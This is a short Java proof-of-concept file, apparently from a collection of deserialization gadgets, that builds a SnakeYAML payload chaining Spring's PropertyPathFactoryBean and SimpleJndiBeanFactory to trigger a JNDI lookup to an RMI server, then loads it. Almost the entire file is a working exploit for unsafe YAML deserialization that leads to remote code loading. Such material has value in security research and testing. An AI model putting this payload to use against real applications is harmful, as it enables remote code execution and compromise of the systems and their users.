package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// Spring PropertyPathFactoryBean EXP
public class SpringPropertyPathFactoryBeanEXP {
    public static void main(String[] args) {
        String payload = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: \"rmi://127.0.0.1:1099/7dwqhm\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"rmi://127.0.0.1:1099/7dwqhm\"]";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
